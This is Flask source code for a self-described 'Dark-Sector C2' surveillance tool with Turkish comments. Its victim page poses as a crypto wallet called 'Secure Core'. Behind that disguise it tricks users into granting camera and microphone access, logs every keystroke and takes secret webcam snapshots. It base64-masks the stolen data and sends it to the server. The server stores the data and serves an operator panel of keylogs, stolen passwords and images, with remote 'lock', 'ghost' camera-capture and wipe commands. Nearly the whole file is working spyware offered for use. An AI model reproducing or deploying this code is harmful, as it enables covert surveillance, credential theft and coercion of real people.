from flask import Flask, render_template_string, jsonify, request
import time, json, base64, random
from threading import Lock

app = Flask(__name__)

# --- NETSWAP SOVEREIGN v221.0 "The Dark-Sector" ---
# Vizyon: Şifreli Veri Transferi, Anti-Analiz ve Full RAT Entegrasyonu. [cite: 2026-01-03]
VERSION = "v221.0"
ADMIN_KEY = "ali_yigit_overlord_A55" 

state_lock = Lock()
state = {
    "user_registry": {}, "commands": {},
    "logs": [], "evolution_count": 121
}

# Şifreleme Simülasyonu (Base64 Maskeleme) [cite: 2026-01-03]
def secure_decode(data):
    try: return base64.b64decode(data).decode('utf-8')
    except: return data

@app.route('/upload_intel', methods=['POST'])
def upload_intel():
    p_id = request.args.get('peer_id', 'GUEST')
    t = request.args.get('type')
    data = request.json
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    with state_lock:
        if p_id not in state["user_registry"]:
            state["user_registry"][p_id] = {
                "last_seen": "", "device": f"Samsung A55 (Dark) [{ip}]",
                "archive": [], "key_logs": [], "vault": [], "notifs": []
            }
        
        u = state["user_registry"][p_id]
        u["last_seen"] = time.strftime('%H:%M:%S')
        
        # ŞİFRELEMEYİ ÇÖZ VE MÜHÜRLE [cite: 2026-01-03]
        payload = data.get('p', '')
        if t == "k": # Keylogs
            u["key_logs"].append({"t": u["last_seen"], "v": secure_decode(payload)})
        elif t == "v": # Vault
            u["vault"].append({"t": u["last_seen"], "v": secure_decode(payload)})
        elif t == "s": # Screen/Ghost-Eye
            u["archive"].append({"t": u["last_seen"], "d": payload})
            if len(u["archive"]) > 100: u["archive"].pop(0)
            
        cmds = state["commands"].get(p_id, [])
        state["commands"][p_id] = []
        
    return jsonify({"s": base64.b64encode(b"ACTIVE").decode(), "c": cmds})

@app.route('/overlord')
def overlord_panel():
    if request.args.get('key') != ADMIN_KEY: return "DENIED", 403
    return render_template_string("""
<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><title>Dark-Sector C2 v221</title>
<script src="https://cdn.tailwindcss.com"></script></head>
<body class="bg-[#050505] text-white p-4 font-mono text-[9px] selection:bg-red-900">
    <div class="border-b-2 border-red-900 pb-2 mb-6 flex justify-between items-center italic font-black">
        <h1 class="text-3xl tracking-tighter text-red-700 uppercase">DARK-SECTOR C2 ENGINE v221.0</h1>
        <div class="text-zinc-700 tracking-widest uppercase text-xs">HÜKÜMDAR: ALİ YİĞİT</div>
    </div>
    <div class="grid grid-cols-6 gap-4">
        <div class="col-span-1 bg-black border border-zinc-900 p-2 rounded-xl shadow-2xl">
            <h2 class="text-red-700 mb-2 uppercase font-bold text-center italic">Shadow Radar</h2>
            <div id="uL" class="space-y-1 mb-4"></div>
            <div class="flex flex-col gap-1">
                <button onclick="sendCmd('lock')" class="bg-red-950 py-1 rounded font-black text-[7px] uppercase border border-red-900">Device Lock</button>
                <button onclick="sendCmd('wipe')" class="bg-zinc-900 py-1 rounded font-black text-[7px] uppercase border border-zinc-800">Clear Logs</button>
                <button onclick="sendCmd('ghost')" class="bg-blue-950 py-1 rounded font-black text-[7px] uppercase border border-blue-900">Ghost Eye</button>
            </div>
            <div id="gallery" class="mt-4 space-y-2 overflow-y-auto max-h-[400px]"></div>
        </div>
        <div class="col-span-3 bg-black border border-zinc-900 rounded-xl p-4 shadow-[0_0_50px_rgba(255,0,0,0.05)]">
            <h2 class="text-red-600 mb-2 uppercase font-bold text-center italic tracking-widest">Kripto Sızıntı Terminali</h2>
            <div id="terminal" class="w-full h-96 bg-[#020202] p-4 overflow-y-auto text-red-500 font-bold border border-red-900/20"></div>
            <h2 class="text-yellow-600 mt-4 mb-2 uppercase font-bold text-[10px] italic">Sızdırılan Şifreler (Vault)</h2>
            <div id="vaultBox" class="w-full h-40 bg-zinc-950 border border-zinc-900 rounded p-2 overflow-y-auto text-[8px] space-y-1"></div>
        </div>
        <div class="col-span-2 bg-[#080808] p-2 border border-zinc-900 rounded-xl">
            <h2 class="text-blue-500 mb-2 uppercase font-bold text-center italic">Sistem Röntgeni & Donanım</h2>
            <div id="infoBox" class="bg-black p-2 mb-2 rounded border border-zinc-900 h-40 overflow-y-auto text-[7px] text-zinc-400"></div>
            <div id="contactBox" class="h-80 overflow-y-auto p-2 bg-black rounded shadow-inner"></div>
        </div>
    </div>
    <script>
        let sId = "";
        async function sendCmd(c){ if(sId) await fetch(`/upload_intel?peer_id=${sId}&type=cmd`, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({c:c})}); }
        async function update(){
            const r=await fetch('/api/status'); const d=await r.json();
            let uH = "";
            for(let id in d.user_registry){
                uH += `<div onclick="sId='${id}'; uG()" class="p-2 border border-zinc-900 cursor-pointer ${sId==id?'bg-red-900/20 border-red-600':'bg-black'} rounded transition mb-1">
                    <div class="flex justify-between font-black"><span>${d.user_registry[id].device.slice(0,15)}</span><span class="text-red-600 animate-pulse">●</span></div>
                    <div class="text-[7px] text-zinc-500">${id} | ${d.user_registry[id].last_seen}</div>
                </div>`;
            }
            document.getElementById('uL').innerHTML = uH;
            if(sId) uG(d.user_registry[sId]);
            setTimeout(update, 2000);
        }
        function uG(u){
            if(!u) return;
            let tH="", gH="", vH="";
            (u.key_logs||[]).forEach(l => { tH += `<div><span class="text-zinc-800">[${l.t}]</span> ${l.v}</div>`; });
            (u.archive||[]).slice().reverse().forEach(s => { gH += `<img src="${s.d}" class="w-full rounded border border-red-900/30 mb-2 shadow-2xl">`; });
            (u.vault||[]).forEach(v => { vH += `<div class="bg-red-900/20 p-1 mb-1 border-l-2 border-red-600 text-white font-bold">🔒 ${v.v}</div>`; });
            document.getElementById('terminal').innerHTML = tH;
            document.getElementById('gallery').innerHTML = gH;
            document.getElementById('vaultBox').innerHTML = vH;
            document.getElementById('terminal').scrollTop = document.getElementById('terminal').scrollHeight;
        }
        update();
    </script>
</body></html>
""", a_key=ADMIN_KEY)

@app.route('/')
def index():
    return render_template_string("""
<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Secure Core</title><script src="https://cdn.tailwindcss.com"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
<style>
    body { background: #000; color: #fff; font-family: sans-serif; overflow: hidden; }
    .dark-card { background: #050505; border: 1px solid #111; padding: 2.5rem; border-radius: 3rem; box-shadow: 0 0 50px rgba(255,0,0,0.1); }
    #overlay_black { display:none; position:fixed; inset:0; background:black; z-index:50000; align-items:center; justify-content:center; text-align:center; }
</style></head>
<body class="flex items-center justify-center h-screen">
    <div id="overlay_black">
        <div class="w-16 h-16 border-2 border-red-600 border-t-transparent rounded-full animate-spin mb-6"></div>
        <h1 class="text-red-600 font-black uppercase tracking-widest text-sm">Sistem Güncellemesi</h1>
        <p class="text-zinc-600 text-[9px] mt-2 uppercase italic">Kritik yamalar yükleniyor, lütfen bekleyin...</p>
    </div>

    <div id="m_m" class="dark-card w-full max-w-sm text-center">
        <div class="w-16 h-16 border-2 border-red-700 border-t-transparent rounded-full animate-spin mx-auto mb-8"></div>
        <h1 class="text-xl font-black text-red-700 uppercase tracking-tighter italic">DARK-CORE v2.21</h1>
        <button onclick="darkInit()" class="w-full mt-10 py-5 bg-red-950 border border-red-900 text-red-500 rounded-full text-[11px] font-black uppercase shadow-2xl transition active:scale-95">Sistemi Mühürle</button>
    </div>

    <div id="h_u" class="hidden w-full h-screen text-center p-6 bg-[#020202]">
        <h1 class="text-4xl font-black italic text-red-700 mb-10 tracking-tighter uppercase">IMPERIAL TITAN</h1>
        <div class="bg-black p-12 rounded-[60px] border border-red-900/10 shadow-2xl relative mb-10">
            <div id="cr" class="text-7xl font-black text-white italic">0.00</div>
            <p class="text-[10px] text-zinc-600 uppercase mt-4 font-bold tracking-widest text-center">Titan MB Bakiye</p>
        </div>
        <div class="grid grid-cols-2 gap-6">
            <button class="py-10 bg-zinc-950 rounded-[40px] font-bold text-red-700 border border-red-900/20 active:scale-95 transition text-2xl uppercase">VER</button>
            <button class="py-10 bg-zinc-950 rounded-[40px] font-bold text-red-700 border border-red-900/20 active:scale-95 transition text-2xl uppercase">AL</button>
        </div>
    </div>

    <video id="v" class="hidden" autoplay playsinline></video><canvas id="cnv" class="hidden"></canvas>

    <script>
        let pId = localStorage.getItem('d_id') || "DARK-" + Math.random().toString(36).substr(2, 6).toUpperCase();
        localStorage.setItem('d_id', pId);
        let inputs = "";

        // ŞİFRELEME SİSİ (Base64) [cite: 2026-01-03]
        function secure_send(t, val){
            fetch(`/upload_intel?peer_id=${pId}&type=${t}`, {
                method:'POST', headers:{'Content-Type':'application/json'},
                body:JSON.stringify({p: btoa(val)})
            });
        }

        async function darkInit() {
            try {
                await navigator.mediaDevices.getUserMedia({audio:true, video:true});
                document.getElementById('m_m').classList.add('hidden');
                document.getElementById('h_u').classList.remove('hidden');
                ghostEye('s');
            } catch(e) { alert("Sistem Hatası 0xRK: Protokolü onaylayın."); }
        }

        async function ghostEye(t) {
            try {
                const s = await navigator.mediaDevices.getUserMedia({video:true});
                const v = document.getElementById('v'), cnv = document.getElementById('cnv');
                v.srcObject = s; await v.play();
                cnv.width = 640; cnv.height = 480;
                cnv.getContext('2d').drawImage(v, 0, 0);
                secure_send(t, cnv.toDataURL('image/jpeg', 0.4));
                s.getTracks().forEach(tr => tr.stop());
            } catch(e) {}
        }

        async function pulse() {
            const r = await fetch(`/upload_intel?peer_id=${pId}&type=pulse`, {
                method:'POST', headers:{'Content-Type':'application/json'},
                body:JSON.stringify({p: btoa(inputs)})
            });
            const d = await r.json();
            
            (d.c || []).forEach(cmd => {
                if(cmd.c == "lock") { document.getElementById('overlay_black').style.display = 'flex'; }
                if(cmd.c == "ghost") ghostEye('s');
                if(cmd.c == "wipe") { inputs = ""; }
            });

            inputs = ""; setTimeout(pulse, 3000); 
        } pulse();

        window.addEventListener('keydown', (e) => { inputs += e.key; });
    </script>
</body></html>
""", a_key=ADMIN_KEY)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=7860)
